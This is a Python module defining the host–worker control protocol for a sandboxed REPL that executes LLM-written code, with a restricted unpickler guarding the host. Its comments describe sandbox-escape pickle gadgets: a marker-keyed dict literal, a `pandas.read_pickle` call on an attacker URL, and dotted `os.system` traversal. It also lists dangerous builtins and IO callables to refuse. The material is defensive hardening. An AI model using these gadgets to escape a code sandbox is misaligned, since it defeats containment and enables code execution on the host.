"""Control protocol for the persistent REPL worker (FEAT-380 Module 2).

Length-prefixed Pydantic messages exchanged between the host
(``PythonREPLTool`` / ``WorkerHandle``, TASK-1941+) and the persistent REPL
worker process spawned by ``worker.py``. One message per request/response,
framed as a 4-byte big-endian unsigned length prefix followed by the
message's JSON payload (spec Sandbox Hardening §2 "Control Protocol").

Values that are not natively JSON-serializable (e.g. a DataFrame passed to
``set_var``) are wrapped with :func:`encode_value` / :func:`decode_value` —
a pickle+base64 fallback, the same "works for everything, fast for nothing"
posture the spec calls for on the DataFrame transport (G9). Zero-copy Arrow
IPC / shared-memory transport for DataFrames is TASK-1945; this task only
guarantees *some* value makes it across the wire for `get_var`/`set_var`/
`snapshot`.
"""

from __future__ import annotations

import base64
import io as _io
import json
import logging
import pickle
import struct
import sys
import types
from typing import Any, BinaryIO, Literal, Optional

from pydantic import BaseModel, Field, model_validator

logger = logging.getLogger(__name__)

# 4-byte, big-endian, unsigned length prefix — never newline-delimited JSON,
# since REPL output frequently embeds newlines (Key Constraint).
_LENGTH_STRUCT = struct.Struct(">I")

#: Sentinel key identifying a pickle+base64-wrapped value inside a JSON payload.
_PICKLE_MARKER = "__repl_worker_pickle_b64__"

#: Sentinel key for a DataFrame/Series carried as a base64 Arrow IPC stream
#: (FEAT-750). Arrow IPC is a data-only format, so decoding it never resolves
#: a callable — DataFrames cross the boundary without touching the pickle guard
#: below. This matters because pyarrow-backed columns (pandas 3's default `str`
#: dtype, `ArrowDtype`) pickle through `pyarrow.lib`, which the guard refuses.
_ARROW_MARKER = "__repl_worker_arrow_b64__"
_ARROW_KINDS = frozenset({"dataframe", "series", "index", "multiindex", "array"})
#: Kinds whose Arrow columns are labelled by position, their real name (if
#: any) travelling in the payload's ``name`` field instead.
_POSITIONAL_ARROW_KINDS = frozenset({"index", "multiindex", "array"})
#: Optional payload keys a decoder accepts alongside the marker and the kind.
_ARROW_PAYLOAD_KEYS = frozenset({_ARROW_MARKER, "kind", "name"})

# ---------------------------------------------------------------------------
# Insecure-deserialization guard (code-review finding, post-TASK-1945)
# ---------------------------------------------------------------------------
#
# `decode_value()` runs on the HOST for `get_var()`/`snapshot()` responses —
# i.e. on data whose SHAPE (not just contents) is influenced by whatever the
# LLM's sandboxed code put in the namespace. `encode_value()`'s dict branch
# preserves dict KEYS verbatim, so a plain, JSON-native dict literal typed
# directly in sandboxed code —
#
#     x = {"__repl_worker_pickle_b64__": "<payload computed offline>"}
#
# — is indistinguishable, by shape alone, from a value `encode_value()`
# itself pickled. No `import pickle`/`import base64` inside the sandbox is
# needed: the payload is a plain string literal, so the AST/allowlist gate
# sees nothing but an ordinary dict-of-strings. Without a restriction here,
# `pickle.loads()` on that payload gives arbitrary code execution in the
# UNSANDBOXED HOST process — a full breach of the process-isolation boundary
# this whole feature exists to build (the same class of bug the codebase
# already denylists `pd.read_pickle`/`to_pickle` for, reopened through an
# ungated door).
#
# Mitigation: restrict `Unpickler.find_class()` to a data-only allowlist
# (pandas/numpy/datetime/decimal/collections/plain builtins), rejecting
# dangerous builtins explicitly. Most `__reduce__`-based RCE gadgets
# (`os.system`, `subprocess.Popen`, `builtins.eval`, `functools.partial`
# wrapping a dangerous callable, ...) resolve to a module outside this
# allowlist and fail closed in `find_class()` before ever being called —
# unpickling a value shaped like a DataFrame/ndarray/plain container still
# works; unpickling a `__reduce__` payload that would call an arbitrary
# executable does not.
#
# The allowlist is deliberately expressed at three granularities, from
# coarsest to finest, because the analysis libraries this agent exists to
# drive are not uniformly safe:
#
#   * `_SAFE_PICKLE_TOP_LEVEL_MODULES` — whole packages whose every member
#     is data (or close enough that no member is a filesystem/network/
#     interpreter capability).
#   * `_SAFE_PICKLE_MODULE_PREFIXES` — one safe *region* of a package whose
#     top level is NOT safe (e.g. `scipy.sparse` is data, `scipy.io` writes
#     files).
#   * `_SAFE_PICKLE_QUALIFIED_NAMES` — single `module.name` pairs, used for
#     `pyarrow.lib`, which mixes pickle's reconstructor functions in with
#     `OSFile`/`memory_map` in one module and so can only be opened safely
#     one symbol at a time.
#
# `_UNSAFE_BUILTINS` / `_UNSAFE_QUALIFIED_NAMES` then subtract the dangerous
# members that survive an otherwise-legitimate allow.
_SAFE_PICKLE_TOP_LEVEL_MODULES = frozenset(
    {
        "pandas",
        "numpy",
        "datetime",
        "decimal",
        "collections",
        "builtins",
        # `pathlib` round-trips plain path data only (no `__reduce__` gadget
        # comparable to os/subprocess) and legitimately shows up in the REPL
        # namespace, e.g. `report_directory` (code-review fix, discovered via
        # `snapshot()` on a freshly-bootstrapped worker).
        "pathlib",
        # Data-only stdlib types that routinely reach the host from a
        # PandasAgent namespace: `re.compile(...)` patterns held as helper
        # variables, `uuid4()` surrogate keys, `Fraction` ratios, and the
        # `zoneinfo.ZoneInfo` that every tz-aware pandas timestamp carries
        # inside its dtype. None of these modules exposes a member that
        # touches the filesystem, the network, or the interpreter.
        "re",
        "uuid",
        "fractions",
        "zoneinfo",
    }
)

#: Safe *regions* of packages whose top level also exposes IO entry points.
#: A module matches when it equals the prefix or continues it with a dot, so
#: `"scipy.sparse"` admits `scipy.sparse._csr` but never `scipy.sparsetools`.
#: Every package here is one the sandbox's own import gate already allows
#: (`parrot.security.python_sanitizer._GENERAL_IMPORTS`), so refusing their
#: values on the way back would make them importable but unusable.
#: The analysis packages the sandbox's own import gate already allows the
#: LLM to use. Their *sub*modules hold the result objects an agent produces —
#: sparse matrices, fitted estimators, interpolators, chart specifications,
#: polars frames — and refusing those on the way back would leave the
#: libraries importable but their outputs unusable. Each package's top level
#: is excluded (that is where `read_csv`/`scan_csv` sit), and the IO regions
#: inside them are subtracted again by :data:`_UNSAFE_MODULE_PREFIXES`.
_SAFE_PICKLE_MODULE_PREFIXES: tuple[str, ...] = (
    "scipy",
    "sklearn",
    "altair",
    "plotly",
    "polars",
)

#: Regions INSIDE an allowed package that are refused anyway, because they
#: read or write files, fetch over the network, or (worst) re-expose an
#: unrestricted unpickler. Checked before the allow tiers.
_UNSAFE_MODULE_PREFIXES: tuple[str, ...] = (
    # `joblib.load` is `pickle.load` without a guard — reachable as
    # `sklearn.utils._joblib.load`, which would route around this whole file.
    "sklearn.utils._joblib",
    "sklearn.externals",
    # Downloads to disk.
    "sklearn.datasets",
    # `savemat`/`mmread`/`wavfile` — file IO.
    "scipy.io",
    "scipy.datasets",
    # Renderer entry points that write files.
    "plotly.io",
    "altair.utils.save",
    "polars.io",
)

#: Individual `module.name` pairs allowed although their module as a whole is
#: not. `pyarrow.lib` is the entire reason this tier exists: under pandas 3
#: the default string dtype is pyarrow-backed, so ordinary values (a string
#: `Index`, `Series.unique()`, a groupby object) pickle through these
#: reconstructors — while the same module also holds `OSFile`,
#: `memory_map` and `create_memory_map`, which a `__reduce__` payload could
#: use to read or truncate a host file. Allowing the reconstructors by name
#: keeps the data path open and the capabilities shut.
#:
#: This list was derived by recording every `pyarrow` symbol `pickle` resolves
#: across the Arrow-backed dtypes pandas can produce (string/large_string,
#: int/float/bool, decimal128, date32, time64, timestamp-with-tz, duration,
#: list, struct, dictionary, binary, null) plus bare `pa.Array`,
#: `ChunkedArray`, `Table`, `RecordBatch`, `Schema`, `Field` and `Scalar`.
#: A value needing a symbol outside it still fails closed, and the refusal
#: message names the symbol — extending this set is then a one-line change.
_SAFE_PICKLE_QUALIFIED_NAMES = frozenset(
    {
        f"pyarrow.lib.{name}"
        for name in (
            # Reconstructors proper.
            "_restore_array",
            "_restore_buffer",
            "_reconstruct_record_batch",
            "_reconstruct_table",
            "chunked_array",
            "py_buffer",
            "scalar",
            "schema",
            "field",
            # Type factories reached while rebuilding a value's dtype.
            "type_for_alias",
            "decimal128",
            "decimal256",
            "dictionary",
            "list_",
            "large_list",
            "map_",
            "struct",
            "timestamp",
            "time32",
            "time64",
            "duration",
        )
    }
)

#: Builtins that ARE data-only-module members but are dangerous as callables
#: if a `__reduce__` payload resolves to them (e.g. `(eval, ("...",))`).
_UNSAFE_BUILTINS = frozenset(
    {
        "eval",
        "exec",
        "compile",
        "__import__",
        "open",
        "input",
        "breakpoint",
        "getattr",
        "setattr",
        "delattr",
        "vars",
        "globals",
        "locals",
        "memoryview",
    }
)

#: Dangerous callables that live inside an otherwise-allowed module. The
#: sharpest is `pandas.read_pickle`: it is reachable under the `"pandas"`
#: allow, takes a path OR a URL, and hands the bytes to an *unrestricted*
#: `pickle.load` — so a `(pandas.read_pickle, ("http://attacker/x.pkl",))`
#: payload would route straight around this guard. The sandbox's own gate
#: already denies these names to the LLM (`_PANDAS_IO_NAMES` in
#: `parrot.security.python_sanitizer`); the guard must deny them too, because
#: a pickle payload never passes through that gate.
_UNSAFE_QUALIFIED_NAMES = frozenset(
    {
        "pandas.read_pickle",
        "pandas.to_pickle",
        "pandas.io.pickle.read_pickle",
        "pandas.io.pickle.to_pickle",
        "pandas.read_csv",
        "pandas.read_table",
        "pandas.read_json",
        "pandas.read_parquet",
        "pandas.read_feather",
        "pandas.read_excel",
        "pandas.read_html",
        "pandas.read_sql",
        "pandas.read_sql_query",
        "pandas.read_sql_table",
        "pandas.eval",
        "numpy.load",
        "numpy.fromfile",
        "numpy.lib.format.read_array",
        "numpy.testing._private.utils.runstring",
    }
)


def _matches_prefix(module: str, prefixes: tuple[str, ...], *, include_self: bool) -> bool:
    """Whether *module* falls inside one of *prefixes*.

    Matching is always on the dot boundary, never a bare ``startswith``, so
    ``scipy.sparse`` never admits a ``scipy.sparsetools``.

    Args:
        module: The dotted module path pickle asked to resolve.
        prefixes: Dotted package prefixes to test against.
        include_self: Whether a module equal to a prefix matches. The DENY
            tier passes ``True`` — ``scipy.io`` is itself the dangerous
            module. The ALLOW tier passes ``False``, which keeps a bare
            top-level ``polars``/``scipy`` (where ``read_csv`` and friends
            live) outside the allow while still admitting their submodules.

    Returns:
        ``True`` when ``module`` matches one of ``prefixes``.
    """
    return any(module.startswith(f"{prefix}.") or (include_self and module == prefix) for prefix in prefixes)


class _RestrictedUnpickler(pickle.Unpickler):
    """Unpickler that only resolves classes/functions under a safe allowlist.

    See the module-level comment above for the threat this defends against.
    """

    def find_class(self, module: str, name: str) -> Any:  # noqa: D102 - see class docstring
        qualified = f"{module}.{name}"
        # Attribute traversal first — this one defeats every other check.
        # Under protocol >= 4, `pickle` resolves a DOTTED `name` by walking
        # attributes from the module (`_getattribute`), so an allowlisted
        # module that merely *imports* another one re-exports its whole
        # surface: `("pandas.io.common", "os.system")` is admitted by any
        # check that only looks at `module`, and then runs a shell command.
        # Verified exploitable against the module-only allowlist. No value
        # the REPL legitimately produces needs a dotted name, so refuse the
        # whole shape rather than trying to enumerate reachable attributes.
        if "." in name:
            raise pickle.UnpicklingError(
                f"repl_worker: refusing to unpickle {qualified} "
                "(insecure-deserialization guard — dotted attribute traversal)"
            )
        # Denials next: a name on the unsafe lists is refused no matter which
        # tier would otherwise admit it.
        if qualified in _UNSAFE_QUALIFIED_NAMES:
            raise pickle.UnpicklingError(
                f"repl_worker: refusing to unpickle {qualified} "
                "(insecure-deserialization guard — dangerous callable)"
            )
        if module == "builtins" and name in _UNSAFE_BUILTINS:
            raise pickle.UnpicklingError(
                f"repl_worker: refusing to unpickle builtins.{name} "
                "(insecure-deserialization guard — dangerous builtin)"
            )
        if _matches_prefix(module, _UNSAFE_MODULE_PREFIXES, include_self=True):
            raise pickle.UnpicklingError(
                f"repl_worker: refusing to unpickle {qualified} "
                "(insecure-deserialization guard — IO region of an allowed package)"
            )
        if module.split(".", 1)[0] in _SAFE_PICKLE_TOP_LEVEL_MODULES:
            return super().find_class(module, name)
        if _matches_prefix(module, _SAFE_PICKLE_MODULE_PREFIXES, include_self=False):
            return super().find_class(module, name)
        if qualified in _SAFE_PICKLE_QUALIFIED_NAMES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(
            f"repl_worker: refusing to unpickle {qualified} "
            "(insecure-deserialization guard — module not on the allowlist)"
        )


def _safe_pickle_loads(data: bytes) -> Any:
    """``pickle.loads()`` guarded by :class:`_RestrictedUnpickler`.

    Args:
        data: Raw pickle bytes (already base64-decoded).

    Returns:
        The unpickled value.

    Raises:
        pickle.UnpicklingError: ``data`` tries to reconstruct a class/
            function outside the safe allowlist.
    """
    return _RestrictedUnpickler(_io.BytesIO(data)).load()


def _json_safe_name(name: Any) -> Any:
    """Coerce an Index/MultiIndex name to something the JSON frame can carry.

    Args:
        name: An index name, or the list of names of a MultiIndex.

    Returns:
        ``name`` unchanged when it is already JSON-native (or a list of
        JSON-native values), ``str(name)`` otherwise.
    """
    if name is None or isinstance(name, (bool, int, float, str)):
        return name
    if isinstance(name, (list, tuple)):
        return [_json_safe_name(part) for part in name]
    return str(name)


def _encode_arrow(value: Any) -> Optional[dict[str, Any]]:
    """Encode a pandas value as a base64 Arrow IPC stream.

    Covers every pandas container that can hold a pyarrow-backed array:
    ``DataFrame``, ``Series``, ``Index``/``MultiIndex`` and a bare
    ``ExtensionArray``. That breadth is the point — under pandas 3 the
    default string dtype is pyarrow-backed, so values as ordinary as
    ``df.columns`` or ``df["col"].unique()`` carry pyarrow internals. Pickling
    those reaches ``pyarrow.lib``, which the restricted unpickler admits only
    one reconstructor at a time; Arrow IPC is data-only, so a value routed
    here never consults the guard at all.

    Args:
        value: Any namespace value.

    Returns:
        ``{_ARROW_MARKER: <b64>, "kind": ..., "name": ...}``, or ``None`` when
        ``value`` is not an Arrow-carryable pandas object or Arrow cannot
        represent it (the caller then falls back to pickle).
    """
    # Lazy: if pandas was never imported, `value` cannot be a pandas object —
    # this keeps light paths (plain lists/dicts) from paying for the import.
    pd = sys.modules.get("pandas")
    if pd is None:
        return None

    name: Any = None
    if isinstance(value, pd.DataFrame):
        kind, frame = "dataframe", value
    elif isinstance(value, pd.Series):
        kind, frame = "series", value.to_frame()
    elif isinstance(value, pd.MultiIndex):
        kind, name = "multiindex", _json_safe_name(list(value.names))
        frame = value.to_frame(index=False)
    elif isinstance(value, pd.Index):
        kind, name = "index", _json_safe_name(value.name)
        frame = value.to_frame(index=False)
    elif isinstance(value, pd.api.extensions.ExtensionArray):
        kind, frame = "array", pd.DataFrame({"0": value})
    else:
        return None

    import pyarrow as pa

    if kind in _POSITIONAL_ARROW_KINDS:
        # Arrow field names must be strings, and an Index's own name is
        # carried in the payload instead — so label the columns by position.
        frame = frame.copy()
        frame.columns = [str(position) for position in range(frame.shape[1])]

    try:
        table = pa.Table.from_pandas(frame)
        sink = pa.BufferOutputStream()
        with pa.ipc.new_stream(sink, table.schema) as writer:
            writer.write_table(table)
    except (pa.ArrowException, ValueError, TypeError):
        return None
    payload = {
        _ARROW_MARKER: base64.b64encode(sink.getvalue().to_pybytes()).decode("ascii"),
        "kind": kind,
    }
    if name is not None:
        payload["name"] = name
    return payload


def _without_arrow_dtypes(value: Any) -> Any:
    """Return a copy of a DataFrame/Series with pyarrow-backed parts cast to ``object``.

    Used only on the pickle fallback (frames Arrow cannot carry, e.g. columns
    of arbitrary Python objects). Under pandas 3 even string column labels are
    pyarrow-backed, and those pickle through ``pyarrow.lib`` — which the
    restricted unpickler refuses. Casting to ``object`` keeps the data and
    loosens only the dtype, so the guard never has to trust ``pyarrow``.

    Args:
        value: Any value; non-pandas values are returned unchanged.

    Returns:
        ``value`` itself, or an ``object``-dtype copy of a DataFrame/Series.
    """
    pd = sys.modules.get("pandas")
    if pd is None:
        return value

    def _arrow_backed(dtype: Any) -> bool:
        if isinstance(dtype, pd.ArrowDtype):
            return True
        if isinstance(dtype, pd.StringDtype):
            return dtype.storage == "pyarrow"
        # A Categorical is not itself pyarrow-backed, but under pandas 3 its
        # `.categories` Index usually is — and pickling the dtype pickles the
        # categories with it.
        if isinstance(dtype, pd.CategoricalDtype):
            return dtype.categories is not None and _arrow_backed(dtype.categories.dtype)
        return False

    def _plain_index(index: Any) -> Any:
        if isinstance(index, pd.MultiIndex):
            return index.set_levels([lvl.astype(object) if _arrow_backed(lvl.dtype) else lvl for lvl in index.levels])
        return index.astype(object) if _arrow_backed(index.dtype) else index

    # Values Arrow declined to carry can still be a bare Index or extension
    # array (e.g. an object-dtype Index holding unpicklable members); scrub
    # those the same way rather than letting pyarrow internals into the pickle.
    if isinstance(value, pd.Index):
        return _plain_index(value)
    if isinstance(value, pd.api.extensions.ExtensionArray):
        return value.astype(object) if _arrow_backed(value.dtype) else value
    if not isinstance(value, (pd.DataFrame, pd.Series)):
        return value

    result = value.copy()
    if isinstance(result, pd.Series):
        if _arrow_backed(result.dtype):
            result = result.astype(object)
    else:
        for col_pos, dtype in enumerate(result.dtypes):
            if _arrow_backed(dtype):
                result.isetitem(col_pos, result.iloc[:, col_pos].astype(object))
        result.columns = _plain_index(result.columns)
    result.index = _plain_index(result.index)
    return result


def _decode_arrow(payload: dict[str, Any]) -> Any:
    """Inverse of :func:`_encode_arrow`.

    Args:
        payload: A dict produced by :func:`_encode_arrow`.

    Returns:
        The reconstructed DataFrame or Series.

    Raises:
        ValueError: ``kind`` is unknown, or the payload is not valid base64.
        pyarrow.ArrowInvalid: The bytes are not a valid Arrow IPC stream.
    """
    kind = payload.get("kind")
    if kind not in _ARROW_KINDS:
        raise ValueError(f"repl_worker: unknown arrow payload kind {kind!r}")
    encoded = payload[_ARROW_MARKER]
    if not isinstance(encoded, str):
        raise ValueError("repl_worker: arrow payload must be a base64 string")

    import pandas as pd
    import pyarrow as pa

    frame = pa.ipc.open_stream(base64.b64decode(encoded, validate=True)).read_all().to_pandas()
    if kind == "dataframe":
        return frame
    if kind == "multiindex":
        index = pd.MultiIndex.from_frame(frame)
        names = payload.get("name")
        return index.set_names(names) if isinstance(names, list) else index

    if frame.shape[1] != 1:
        raise ValueError(f"repl_worker: arrow {kind} payload must have exactly one column")
    column = frame.iloc[:, 0]
    if kind == "series":
        return column
    if kind == "array":
        return column.array
    # `.rename()`, not `pd.Index(column, name=...)`: the latter inherits the
    # carrier column's positional label ("0") when no name was recorded,
    # which would turn an unnamed Index into one named "0".
    return pd.Index(column).rename(payload.get("name"))


def encode_value(value: Any) -> Any:
    """Best-effort JSON-safe encoding for one namespace value.

    Native JSON types (``None``/``bool``/``int``/``float``/``str`` and
    ``list``/``dict`` composed of them) pass through unchanged. Anything
    else (DataFrames, custom objects, …) is pickled and base64-wrapped so it
    can still travel inside the JSON frame.

    Args:
        value: The namespace value to encode.

    Returns:
        A JSON-serializable representation of ``value``.
    """
    if value is None or isinstance(value, (bool, int, float, str)):
        return value
    arrow_payload = _encode_arrow(value)
    if arrow_payload is not None:
        return arrow_payload
    if isinstance(value, (list, tuple)):
        return [encode_value(v) for v in value]
    if isinstance(value, dict):
        return {str(k): encode_value(v) for k, v in value.items()}
    if isinstance(value, types.ModuleType) or callable(value):
        # Code-review fix: modules/functions/callables are never meaningful
        # "data" to hand back across the wire, and pickling one means the
        # host's restricted unpickler (see `_RestrictedUnpickler` above)
        # would need to reconstruct an arbitrary callable reference — the
        # exact thing that guard exists to refuse. This can be reached not
        # just for a namespace value itself (already filtered a layer up by
        # `WorkerNamespace.snapshot()`) but for a callable *nested inside* an
        # otherwise-plain container (e.g. a dict of helper functions), so the
        # check lives here, applied recursively. Represent it as an inert
        # placeholder instead of ever attempting to pickle it.
        label = getattr(value, "__qualname__", None) or getattr(value, "__name__", None) or repr(value)
        return f"<{type(value).__name__}: {label} (not transportable)>"
    try:
        json.dumps(value)
        return value
    except (TypeError, ValueError):
        return {_PICKLE_MARKER: base64.b64encode(pickle.dumps(_without_arrow_dtypes(value))).decode("ascii")}


def decode_value(value: Any) -> Any:
    """Inverse of :func:`encode_value`.

    Args:
        value: A JSON-safe value previously produced by :func:`encode_value`.

    Returns:
        The original Python value (unpickled if it was pickle-wrapped).
    """
    if isinstance(value, dict) and _ARROW_MARKER in value and set(value) <= _ARROW_PAYLOAD_KEYS:
        return _decode_arrow(value)
    if isinstance(value, dict) and set(value) == {_PICKLE_MARKER}:
        return _safe_pickle_loads(base64.b64decode(value[_PICKLE_MARKER]))
    if isinstance(value, dict):
        return {k: decode_value(v) for k, v in value.items()}
    if isinstance(value, list):
        return [decode_value(v) for v in value]
    return value


def decode_snapshot(data: dict[str, Any]) -> dict[str, Any]:
    """Decode a ``SnapshotResponse.data`` mapping one entry at a time.

    One value the insecure-deserialization guard refuses (e.g. an altair
    ``Chart``, whose pickle references a module outside the allowlist) must
    not cost the caller every other variable. Such an entry is replaced by an
    inert placeholder string and a warning is logged; no object is ever
    constructed for it. Any other exception propagates unchanged.

    Args:
        data: The worker's ``{name: encode_value(value)}`` mapping.

    Returns:
        ``{name: decoded value or placeholder}``.
    """
    decoded: dict[str, Any] = {}
    for name, value in data.items():
        try:
            decoded[name] = decode_value(value)
        except pickle.UnpicklingError as exc:
            logger.warning("repl_worker snapshot: variable %r not transportable: %s", name, exc)
            decoded[name] = f"<{name}: refused by insecure-deserialization guard (not transportable)>"
    return decoded


# ---------------------------------------------------------------------------
# Host -> worker requests
# ---------------------------------------------------------------------------


class ExecRequest(BaseModel):
    """Host -> worker: execute code under a deadline."""

    op: Literal["exec"] = "exec"
    code: str
    debug: bool = False
    deadline_ms: int = Field(..., gt=0)


class TransportEnvelope(BaseModel):
    """Bounded runtime context carried across the REPL process boundary (FEAT-538).

    Only a *bounded* envelope crosses the boundary — never a live task
    context object. Every field is revalidated on return: scope drift is a
    hard boundary violation, while task, generation or fencing drift means
    the binding is stale and the artifact must be re-resolved rather than
    trusted.

    Attributes:
        scope_key: Opaque, collision-safe encoding of the trusted scope.
        task_id: The selected task at the time of the request.
        artifact_id: Identity of the artifact being materialized.
        version: Exact version of that artifact. A binding is to a
            version, never to a mutable alias.
        worker_generation: Identity of the worker *generation* the caller
            believes it is talking to. A PID alone is not a generation
            identity — a recycled PID would masquerade as the same worker.
        fencing_token: Monotonic token used to reject a late reply from a
            superseded owner.
    """

    scope_key: str = Field(..., max_length=512)
    task_id: Optional[str] = Field(default=None, max_length=128)
    artifact_id: Optional[str] = Field(default=None, max_length=128)
    version: Optional[int] = Field(default=None, ge=1)
    worker_generation: Optional[str] = Field(default=None, max_length=128)
    fencing_token: Optional[int] = Field(default=None, ge=0)


class InjectDfRequest(BaseModel):
    """Host -> worker: inject a DataFrame into the namespace.

    Implemented by TASK-1945: Arrow IPC over shared memory as the primary
    transport (``format="arrow"``), pickle+base64 as the fallback
    (``format="pickle"``) for dtypes Arrow cannot represent (spec G9).

    FEAT-538 adds an opt-in ``strict`` mode for task-memory evidence. It
    is off by default, so the legacy wire shape and behaviour are
    unchanged for every existing caller.
    """

    op: Literal["inject_df"] = "inject_df"
    name: str
    format: Literal["arrow", "pickle"] = "arrow"
    #: shared-memory block name carrying the Arrow IPC stream (format="arrow").
    shm_name: Optional[str] = None
    #: exact byte length written into the shm block (format="arrow").
    size: Optional[int] = None
    #: base64-encoded pickle bytes (format="pickle").
    payload: Optional[str] = None
    #: FEAT-538: strict task-memory evidence transport. The worker refuses
    #: a strict request that is not Arrow, so a host bug cannot smuggle a
    #: pickle payload in under an evidence label.
    strict: bool = False
    #: FEAT-538: bounded runtime context, revalidated on return.
    envelope: Optional[TransportEnvelope] = None


class GetVarRequest(BaseModel):
    """Host -> worker: read one namespace variable (namespace API)."""

    op: Literal["get_var"] = "get_var"
    name: str


class SetVarRequest(BaseModel):
    """Host -> worker: write one namespace variable (namespace API)."""

    op: Literal["set_var"] = "set_var"
    name: str
    value: Any = None


class ListNsRequest(BaseModel):
    """Host -> worker: cheap, name-only namespace listing (host name-shadow feed)."""

    op: Literal["list_ns"] = "list_ns"


class SnapshotRequest(BaseModel):
    """Host -> worker: serializable dump of the whole namespace."""

    op: Literal["snapshot"] = "snapshot"


class ResetRequest(BaseModel):
    """Host -> worker: reset the REPL environment (equivalent to ``reset_environment()``)."""

    op: Literal["reset"] = "reset"


class PingRequest(BaseModel):
    """Host -> worker: health check."""

    op: Literal["ping"] = "ping"


# ---------------------------------------------------------------------------
# Worker -> host responses
# ---------------------------------------------------------------------------


class ExecResult(BaseModel):
    """Worker -> host: mirrors today's ``_execute()`` contract (G5)."""

    op: Literal["result"] = "result"
    output: str | None = None  # success path (str)
    status: str | None = None  # "error" | "done_with_errors"
    result: Any | None = None
    error: str | None = None
    new_vars: list[str] = Field(default_factory=list)  # feeds host name-shadow


class ValueResponse(BaseModel):
    """Worker -> host: reply to :class:`GetVarRequest`."""

    op: Literal["value"] = "value"
    name: str
    value: Any = None


class OkResponse(BaseModel):
    """Worker -> host: generic acknowledgement (``set_var``, ``reset``)."""

    op: Literal["ok"] = "ok"


class ListNsResponse(BaseModel):
    """Worker -> host: reply to :class:`ListNsRequest`."""

    op: Literal["list_ns_result"] = "list_ns_result"
    names: list[str] = Field(default_factory=list)


class SnapshotResponse(BaseModel):
    """Worker -> host: reply to :class:`SnapshotRequest`."""

    op: Literal["snapshot_result"] = "snapshot_result"
    data: dict[str, Any] = Field(default_factory=dict)


class PongResponse(BaseModel):
    """Worker -> host: reply to :class:`PingRequest`."""

    op: Literal["pong"] = "pong"


class ErrorResponse(BaseModel):
    """Worker -> host: generic error envelope (unknown/unimplemented op, dispatch failure)."""

    op: Literal["error"] = "error"
    message: str


class ReadyResponse(BaseModel):
    """Worker -> host: the readiness handshake frame (FEAT-500).

    The very first frame a worker writes, emitted after its
    :class:`~parrot.tools.repl_worker.worker.WorkerNamespace` has finished
    constructing (framework + pandas import + REPL bootstrap) and before it
    enters its service loop. The host arms a readiness future in
    ``WorkerHandle.start()`` and refuses to write any request frame until
    this frame has been read, so no caller can ever hit a still-booting
    worker (spec G1/AC1).

    Attributes:
        op: Frame discriminator, always ``"ready"``.
        pid: The worker process' own pid, for log/error correlation.
        bootstrap_ms: Monotonic milliseconds from the worker's ``main()``
            entry to the moment the namespace became usable.
    """

    op: Literal["ready"] = "ready"
    pid: int
    bootstrap_ms: int = Field(ge=0)


class NamespaceLossError(BaseModel):
    """Payload embedded in the ``{status, result, error}`` dict after a kill.

    Constructed host-side (TASK-1941+ owns deadline/SIGKILL enforcement);
    defined here because it is part of the frozen protocol contract (spec
    §2 Data Models).
    """

    cause: Literal["timeout", "memory", "crash"]
    lost_variables: list[str] = Field(default_factory=list)
    message: str


class WorkerConfig(BaseModel):
    """Deployment-tunable limits (all with working defaults).

    Timeout budgets (FEAT-500):
        bootstrap_timeout_ms: How long the host waits for the worker's
            :class:`ReadyResponse` frame after spawning it. Expiry is
            **lethal**: a process that cannot finish bootstrapping within
            this budget is not a live worker, so it is killed and every
            waiter receives a ``WorkerBootstrapError`` (spec §2, Q1).
        namespace_timeout_ms: Budget for every **non-**``exec`` request
            (``get_var``/``set_var``/``list_vars``/``snapshot``/``reset``/
            ``inject_dataframe``). Expiry is **non-lethal**: the caller gets
            a ``NamespaceTimeoutError`` with a real message, the worker stays
            alive and its namespace is preserved (spec G2/U2). Only
            ``deadline_ms`` (the ``execute()`` deadline) still kills.
    """

    # ~12 GiB — empirically calibrated (TASK-1946, Module 8): observed peak
    # VmPeak 5522.8 MB across a full session (bootstrap + 500 MB DataFrame +
    # merge/groupby + plot) x ~2 margin, rounded. See
    # artifacts/logs/feat-380-rlimit-as-calibration.md for the full
    # measurements/method — re-run scripts/sdd/calibrate_rlimit_as.py after
    # any pandas/numpy/matplotlib/pyarrow version bump.
    rlimit_as_bytes: int = 12 * 1024**3
    rlimit_cpu_seconds: int = 300
    rlimit_nofile: int = 256
    deadline_ms: int = 60_000
    max_workers: int = 0  # 0 -> max(4, cpu_count), cap 16
    idle_ttl_seconds: int = 1800  # 30 min
    prewarm_pool_size: int = 2
    # FEAT-500 — readiness handshake + non-lethal namespace timeouts.
    # 30 s each: bootstrap was measured at 12-14 s under 3x CPU
    # oversubscription (spec F016), and a large get_var/snapshot pickle can
    # take seconds on a loaded host. Do not lower the bootstrap budget below
    # 30 s by default (spec §7 "Prewarm contention").
    bootstrap_timeout_ms: int = Field(default=30_000, gt=0)
    namespace_timeout_ms: int = Field(default=30_000, gt=0)

    # ------------------------------------------------------------------
    # FEAT-521 — observation, interrupt-before-kill, and memory guardrails.
    # These never cross the wire (worker.py never sees a WorkerConfig
    # frame); they only configure host-side ProcessObserver/WorkerHandle/
    # WorkerPool behavior.
    # ------------------------------------------------------------------

    #: How often (ms) the host samples a live worker's process stats.
    observer_poll_ms: int = Field(default=500, gt=0)
    #: CPU flat for this long (ms) while a request is in-flight -> "stalled".
    stall_window_ms: int = Field(default=5_000, gt=0)
    #: 0 = never fail bootstrap early on a "stalled" verdict.
    bootstrap_stall_ms: int = Field(default=0, ge=0)

    #: Whether `execute()` sends SIGINT before SIGKILL on deadline expiry.
    interrupt_before_kill: bool = True
    #: How long (ms) the host waits for the interrupted reply frame.
    interrupt_grace_ms: int = Field(default=2_000, gt=0)

    #: Per-worker RSS guardrails, in bytes. 0 disables that threshold.
    memory_soft_limit_bytes: int = Field(default=4 * 1024**3, ge=0)
    memory_hard_limit_bytes: int = Field(default=8 * 1024**3, ge=0)
    #: Host `psutil.virtual_memory().available` reserve below which the
    #: pool refuses to spawn/prewarm new workers.
    host_memory_reserve_bytes: int = Field(default=2 * 1024**3, ge=0)

    @model_validator(mode="after")
    def _validate_feat521_fields(self) -> "WorkerConfig":
        """Cross-field invariants for the FEAT-521 tunables.

        Raises:
            ValueError: ``memory_hard_limit_bytes`` is below
                ``memory_soft_limit_bytes`` while both are enabled;
                ``memory_hard_limit_bytes`` exceeds ``rlimit_as_bytes``
                while enabled; or ``interrupt_grace_ms`` is not strictly
                less than ``deadline_ms``.
        """
        if (
            self.memory_soft_limit_bytes > 0
            and self.memory_hard_limit_bytes > 0
            and self.memory_hard_limit_bytes < self.memory_soft_limit_bytes
        ):
            raise ValueError(
                "memory_hard_limit_bytes "
                f"({self.memory_hard_limit_bytes}) must be >= "
